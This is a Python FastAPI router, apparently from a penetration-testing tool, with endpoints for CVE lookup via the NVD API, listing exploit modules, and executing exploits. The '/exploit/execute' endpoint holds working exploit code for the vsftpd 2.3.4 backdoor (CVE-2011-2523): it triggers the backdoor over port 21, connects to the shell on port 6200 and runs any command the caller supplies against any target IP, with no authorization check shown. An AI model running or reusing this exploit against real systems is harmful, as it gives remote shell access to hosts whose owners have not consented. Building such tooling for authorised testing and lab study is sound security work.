"""
Vulnerability endpoints
"""

from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.ext.asyncio import AsyncSession
from typing import List, Optional
from pydantic import BaseModel

from app.core.database import get_db
from app.services.cve_lookup import CVELookupService, RateLimitExceeded
from app.services.exploit_match import ExploitMatchService

router = APIRouter()


class CVELookupRequest(BaseModel):
    """Request for CVE lookup"""
    cve_id: Optional[str] = None
    product: Optional[str] = None
    version: Optional[str] = None
    vendor: Optional[str] = None


class CVELookupResponse(BaseModel):
    """Response for CVE lookup"""
    cve_id: str
    title: Optional[str]
    description: Optional[str]
    cvss_score: Optional[float]
    cvss_vector: Optional[str]
    severity: Optional[str]
    cpe_list: List[str] = []
    affected_products: List[dict] = []
    references: List[str] = []
    cached_at: Optional[str] = None


class ExploitModuleResponse(BaseModel):
    """Response for exploit module"""
    id: str
    cve_id: str
    platform: str
    module_id: Optional[str]
    module_path: Optional[str]
    title: str
    description: Optional[str]
    exploit_type: str
    target_platform: Optional[str]
    rank: Optional[str]
    verified: bool
    exploit_db_id: Optional[int]
    reference_url: Optional[str]


@router.post("/lookup-cve")
async def lookup_cve(
    request: CVELookupRequest,
    db: AsyncSession = Depends(get_db)
):
    """
    Lookup CVE information from NVD API (with caching)
    
    Args:
        request: CVE lookup parameters (cve_id OR product+version)
        
    Returns:
        CVE information or list of CVEs
    """
    try:
        service = CVELookupService(db)
        
        # Lookup by CVE ID
        if request.cve_id:
            result = await service.lookup_by_cve(request.cve_id)
            if not result:
                raise HTTPException(status_code=404, detail=f"CVE {request.cve_id} not found")
            return result
        
        # Lookup by product/version
        elif request.product and request.version:
            results = await service.lookup_by_product_version(
                product=request.product,
                version=request.version,
                vendor=request.vendor
            )
            return {"cves": results, "count": len(results)}
        
        else:
            raise HTTPException(
                status_code=400, 
                detail="Either cve_id or product+version must be provided"
            )
        
    except RateLimitExceeded:
        raise HTTPException(
            status_code=429,
            detail="NVD API rate limit exceeded. Please try again in 30 seconds."
        )
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"CVE lookup failed: {str(e)}")


@router.get("/exploits/{cve_id}", response_model=List[ExploitModuleResponse])
async def get_exploits_for_cve(
    cve_id: str,
    db: AsyncSession = Depends(get_db)
) -> List[ExploitModuleResponse]:
    """
    Get available exploit modules for a CVE
    
    Args:
        cve_id: CVE identifier (e.g., CVE-2023-1234)
        
    Returns:
        List of exploit modules
    """
    try:
        service = ExploitMatchService(db)
        exploits = await service.get_exploits_for_cve(cve_id)
        
        return [ExploitModuleResponse(**e) for e in exploits]
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to fetch exploits: {str(e)}")


class ExploitExecuteRequest(BaseModel):
    """Request to execute an exploit"""
    target_ip: str
    target_port: int
    exploit_type: str  # 'vsftpd_backdoor', 'ssh', 'custom_cmd'
    command: Optional[str] = None  # Command to run once connected


class ExploitExecuteResponse(BaseModel):
    """Response from exploit execution"""
    success: bool
    session_id: Optional[str] = None
    output: str
    shell_port: Optional[int] = None


@router.post("/exploit/execute", response_model=ExploitExecuteResponse)
async def execute_exploit(
    request: ExploitExecuteRequest,
    db: AsyncSession = Depends(get_db)
) -> ExploitExecuteResponse:
    """
    Execute an exploit against a target
    
    Supports:
    - vsftpd_backdoor: vsftpd 2.3.4 backdoor (CVE-2011-2523)
    - custom_cmd: Run a command via an open shell
    """
    import socket
    import time
    import uuid
    
    try:
        if request.exploit_type == 'vsftpd_backdoor':
            # Trigger vsftpd 2.3.4 backdoor
            try:
                # Step 1: Trigger the backdoor
                s = socket.socket()
                s.settimeout(10)
                s.connect((request.target_ip, 21))
                s.recv(1024)
                s.send(b'USER backdoor:)\r\n')
                s.recv(1024)
                s.send(b'PASS x\r\n')
                time.sleep(1)
                s.close()
                
                # Step 2: Connect to backdoor shell on port 6200
                time.sleep(1)
                shell = socket.socket()
                shell.settimeout(10)
                shell.connect((request.target_ip, 6200))
                
                # Execute command if provided
                if request.command:
                    shell.send(f'{request.command}\n'.encode())
                    time.sleep(1)
                    output = shell.recv(8192).decode()
                else:
                    shell.send(b'id && pwd\n')
                    time.sleep(1)
                    output = shell.recv(4096).decode()
                
                shell.close()
                
                session_id = str(uuid.uuid4())[:8]
                return ExploitExecuteResponse(
                    success=True,
                    session_id=session_id,
                    output=output,
                    shell_port=6200
                )
                
            except socket.timeout:
                return ExploitExecuteResponse(
                    success=False,
                    output="Connection timed out - target may not be vulnerable"
                )
            except ConnectionRefusedError:
                return ExploitExecuteResponse(
                    success=False,
                    output="Connection refused - backdoor may not be active"
                )
                
        elif request.exploit_type == 'shell_command':
            # Execute command on existing backdoor shell
            try:
                # Re-trigger backdoor first
                s = socket.socket()
                s.settimeout(5)
                s.connect((request.target_ip, 21))
                s.recv(1024)
                s.send(b'USER backdoor:)\r\n')
                s.recv(1024)
                s.send(b'PASS x\r\n')
                time.sleep(0.5)
                s.close()
                
                time.sleep(0.5)
                shell = socket.socket()
                shell.settimeout(10)
                shell.connect((request.target_ip, 6200))
                shell.send(f'{request.command}\n'.encode())
                time.sleep(1)
                output = shell.recv(8192).decode()
                shell.close()
                
                return ExploitExecuteResponse(
                    success=True,
                    output=output
                )
            except Exception as e:
                return ExploitExecuteResponse(
                    success=False,
                    output=f"Shell command failed: {str(e)}"
                )
        else:
            return ExploitExecuteResponse(
                success=False,
                output=f"Unknown exploit type: {request.exploit_type}"
            )
            
    except Exception as e:
        return ExploitExecuteResponse(
            success=False,
            output=f"Exploit execution failed: {str(e)}"
        )
